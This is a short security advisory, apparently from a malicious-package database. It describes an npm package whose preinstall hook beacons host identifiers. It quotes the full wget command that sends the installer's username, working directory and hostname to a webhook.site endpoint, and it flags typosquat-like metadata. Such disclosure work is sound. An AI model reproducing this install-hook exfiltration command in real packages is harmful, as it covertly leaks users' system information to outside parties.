summary: preinstall hook exfiltrates host identifiers to webhook.site beacon
details: The package.json preinstall script runs `wget --quiet "https://webhook.site/64063d25-fcd3-44e5-a454-34845bc63250/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`, which auto-executes on `npm install` and transmits the installer's username, current working directory, and hostname to an attacker-monitored webhook.site endpoint without consent. The package metadata is otherwise hollow (placeholder author `me`, empty description, name resembling marketplace/Seaport contract packages with a `contractstest` suffix and a `seaport-core-16` dependency), consistent with a reconnaissance/typosquat lure. There is no legitimate reason for an install lifecycle hook to beacon shell-expanded host identifiers to a third-party request-inspection service.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
